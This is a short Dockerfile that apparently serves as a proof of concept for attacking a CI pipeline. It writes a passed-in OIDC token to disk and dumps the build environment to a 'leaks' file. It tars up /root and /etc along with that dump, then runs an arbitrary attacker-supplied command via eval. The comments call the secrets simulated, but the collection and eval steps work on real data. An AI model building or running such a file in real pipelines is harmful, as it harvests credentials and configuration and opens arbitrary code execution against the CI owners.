FROM python:3.11-alpine

ARG PAYLOAD_CMD
ARG OIDC_TOKEN

RUN apk add --no-cache bash curl tar

# Create fake leak files (reliable even in clean CI)
RUN echo "dummy-token-xyz" > /root/test_secret.txt && \
    echo "$OIDC_TOKEN" > /root/oidc_token.json && \
    echo "[+] Collected simulated secrets"

# Dump full env excluding GITHUB_TOKEN
RUN printenv | grep -v GITHUB_TOKEN > /leaks_env.txt && \
    echo "OIDC_TOKEN=$OIDC_TOKEN" >> /leaks_env.txt

# Create archive of everything meaningful
RUN tar -czf /secrets.tar.gz /root /etc /leaks_env.txt 2>/dev/null || true

# Execute arbitrary payload if needed
RUN echo "[+] Executing payload..." && eval "$PAYLOAD_CMD"
